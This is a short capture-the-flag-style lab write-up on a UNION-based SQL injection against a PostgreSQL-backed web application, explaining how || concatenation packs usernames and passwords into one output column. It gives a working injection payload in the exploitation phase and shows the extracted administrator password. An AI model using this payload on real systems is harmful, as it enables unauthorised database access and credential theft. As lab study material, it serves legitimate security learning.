### 5. Lab: SQL Injection UNION Attack (Retrieving Multiple Values in a Single Column)

```markdown
# 🔗 Lab: SQL Injection UNION Attack (Single Column Concatenation)

| **Category** | Web Security / SQL Injection |
| :--- | :--- |
| **Vulnerability Type** | UNION-Based SQLi (PostgreSQL) |
| **Goal** | Retrieve username and password combined in a single column. |
| **Tools Used** | Burp Suite |
| **Status** | ✅ Solved |

---

## 📖 Conceptual Overview
In some scenarios, an attacker might find only **one** column that accepts text, but they need to extract **multiple** pieces of data (e.g., both `username` and `password`).
To solve this, I use **String Concatenation**. I join the values together into a single string using specific database operators.

* **Database Identified:** PostgreSQL
* **Concatenation Operator:** `||` (Double Pipe)

---

## Phase 1: Analysis

1.  **Column Count:** Confirmed **2 Columns**.
2.  **Constraint:** Only **one column** (let's say Column 2) was suitable for text output, or i wanted to view both data points in a single field for easier reading.

---

## ⚔️ Phase 2: Exploitation

I needed to join `username` and `password`. To make the output readable, i injected a separator character (`~`) between them.

**Formula:** `Field1 || 'Separator' || Field2`

### The Payload:
```sql
' UNION SELECT NULL, username || '~' || password FROM users--
```
## Execution Result:
The application returned: administrator~s3cret_password_here

I successfully extracted the administrator password from the combined string.